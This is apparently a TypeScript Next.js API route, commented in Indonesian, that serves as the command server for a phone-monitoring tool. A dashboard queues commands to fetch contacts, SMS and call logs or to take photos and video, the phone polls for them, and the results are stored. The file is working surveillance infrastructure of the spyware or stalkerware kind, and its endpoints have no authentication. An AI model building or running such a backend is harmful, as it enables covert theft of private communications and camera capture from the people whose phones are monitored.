/**
 * /api/commands
 *
 * POST   — web dashboard kirim command ke HP (fetch_contacts, fetch_sms, fetch_calls, take_photo, take_video)
 * GET    — HP polling ambil pending commands, atau web ambil history
 * PATCH  — HP update status command (delivered → executed, atau failed) + simpan result
 */

import type { NextApiRequest, NextApiResponse } from "next";
import db from "@/lib/db";

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method === "POST")  return handlePost(req, res);
  if (req.method === "GET")   return handleGet(req, res);
  if (req.method === "PATCH") return handlePatch(req, res);
  return res.status(405).json({ error: "Method not allowed" });
}

// ─── POST: web kirim command ke device ───────────────────────────────────────

async function handlePost(req: NextApiRequest, res: NextApiResponse) {
  try {
    const { deviceId, command, payload } = req.body as {
      deviceId: string;
      command: string;
      payload?: Record<string, unknown>;
    };

    if (!deviceId || !command) {
      return res.status(400).json({ error: "deviceId and command required" });
    }

    const validCommands = ["fetch_contacts", "fetch_sms", "fetch_calls", "take_photo", "take_video"];
    if (!validCommands.includes(command)) {
      return res.status(400).json({ error: `Invalid command. Valid: ${validCommands.join(", ")}` });
    }

    // Pastikan device ada
    const device = await db.device.findUnique({ where: { id: deviceId } });
    if (!device) {
      return res.status(404).json({ error: "Device not found" });
    }

    const created = await db.deviceCommand.create({
      data: {
        deviceId,
        command,
        payload: (payload ?? {}) as object,
        status: "pending",
      },
    });

    return res.status(201).json({ command: created });
  } catch (error) {
    console.error("[POST /api/commands]", error);
    return res.status(500).json({ error: "Internal server error" });
  }
}

// ─── GET: HP polling pending commands, atau web ambil history ────────────────

async function handleGet(req: NextApiRequest, res: NextApiResponse) {
  try {
    const { deviceId, status, limit = "50", page = "1" } = req.query as Record<string, string>;

    if (!deviceId) {
      return res.status(400).json({ error: "deviceId required" });
    }

    const take = Math.min(parseInt(limit), 200);
    const skip = (parseInt(page) - 1) * take;

    const where = {
      deviceId,
      ...(status && { status }),
    };

    const [commands, total] = await Promise.all([
      db.deviceCommand.findMany({
        where,
        orderBy: { createdAt: "desc" },
        take,
        skip,
      }),
      db.deviceCommand.count({ where }),
    ]);

    // Kalau HP polling (status=pending), mark sebagai delivered
    if (status === "pending" && commands.length > 0) {
      await db.deviceCommand.updateMany({
        where: {
          id: { in: commands.map((c) => c.id) },
          status: "pending",
        },
        data: { status: "delivered" },
      });
    }

    return res.status(200).json({
      commands,
      total,
      page: parseInt(page),
      totalPages: Math.ceil(total / take),
    });
  } catch (error) {
    console.error("[GET /api/commands]", error);
    return res.status(500).json({ error: "Internal server error" });
  }
}

// ─── PATCH: HP update status + simpan result ─────────────────────────────────

async function handlePatch(req: NextApiRequest, res: NextApiResponse) {
  try {
    const { id, status, result } = req.body as {
      id: string;
      status: "executed" | "failed";
      result?: Record<string, unknown>;
    };

    if (!id || !status) {
      return res.status(400).json({ error: "id and status required" });
    }

    const updated = await db.deviceCommand.update({
      where: { id },
      data: {
        status,
        result: (result ?? {}) as object,
        executedAt: new Date(),
      },
    });

    return res.status(200).json({ command: updated });
  } catch (error) {
    console.error("[PATCH /api/commands]", error);
    return res.status(500).json({ error: "Internal server error" });
  }
}
